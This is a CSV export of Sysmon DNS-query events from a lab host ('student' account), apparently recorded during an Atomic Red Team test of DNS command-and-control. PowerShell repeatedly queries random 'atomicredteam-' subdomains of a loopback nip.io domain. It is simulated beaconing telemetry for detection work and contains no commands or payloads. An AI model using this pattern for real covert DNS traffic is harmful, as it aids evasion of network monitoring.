"2025-12-22 13:58:58.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166169,"Query: atomicredteam-500824.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.940","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166170,"Query: atomicredteam-917794.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.981","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.119 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166171,"Query: atomicredteam-577463.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.023","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.119 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166172,"Query: atomicredteam-169320.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.067","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.120 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166173,"Query: atomicredteam-844192.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.111","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.120 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166174,"Query: atomicredteam-172448.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.154","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.120 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166175,"Query: atomicredteam-765143.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.200","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.120 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166176,"Query: atomicredteam-650203.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.243","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.120 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166177,"Query: atomicredteam-910322.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.289","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.121 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166178,"Query: atomicredteam-364686.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.121 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166179,"Query: atomicredteam-924494.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.378","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.121 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166180,"Query: atomicredteam-92552.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.121 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166181,"Query: atomicredteam-865952.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.121 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166182,"Query: atomicredteam-501447.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.122 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166183,"Query: atomicredteam-103658.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.550","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.122 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166184,"Query: atomicredteam-69485.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.724","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.123 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166185,"Query: atomicredteam-924189.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.769","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.124 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166186,"Query: atomicredteam-418928.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.812","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:59.124 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166187,"Query: atomicredteam-345529.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.855","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.128 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166188,"Query: atomicredteam-19256.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.900","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.128 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166189,"Query: atomicredteam-316461.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.942","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.129 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166190,"Query: atomicredteam-437525.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:58.983","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.129 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166191,"Query: atomicredteam-14610.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:59.163","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.129 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166192,"Query: atomicredteam-182717.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:59.205","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.129 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166193,"Query: atomicredteam-153344.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:59.248","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:00.129 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166194,"Query: atomicredteam-639605.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:59.291","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:01.135 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166195,"Query: atomicredteam-18103.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:59.336","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:01.135 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166196,"Query: atomicredteam-162982.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:00.580","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166197,"Query: atomicredteam-188709.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:00.902","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166198,"Query: atomicredteam-889479.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:00.944","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166199,"Query: atomicredteam-482206.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.263","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166200,"Query: atomicredteam-215859.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.307","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166201,"Query: atomicredteam-258647.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.489","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166202,"Query: atomicredteam-51956.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.815","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166203,"Query: atomicredteam-845490.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.865","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166204,"Query: atomicredteam-825123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.905","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:02.144 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166205,"Query: atomicredteam-533583.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:01.946","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166206,"Query: atomicredteam-929994.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.117","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166207,"Query: atomicredteam-488745.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.160","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166208,"Query: atomicredteam-118158.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.201","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166209,"Query: atomicredteam-557935.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.375","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166210,"Query: atomicredteam-752068.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.416","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166211,"Query: atomicredteam-320135.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.461","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166212,"Query: atomicredteam-977707.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.504","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166213,"Query: atomicredteam-295844.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.546","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166214,"Query: atomicredteam-735863.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.586","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166215,"Query: atomicredteam-773699.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.629","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166216,"Query: atomicredteam-599387.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.670","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166217,"Query: atomicredteam-281719.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.711","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
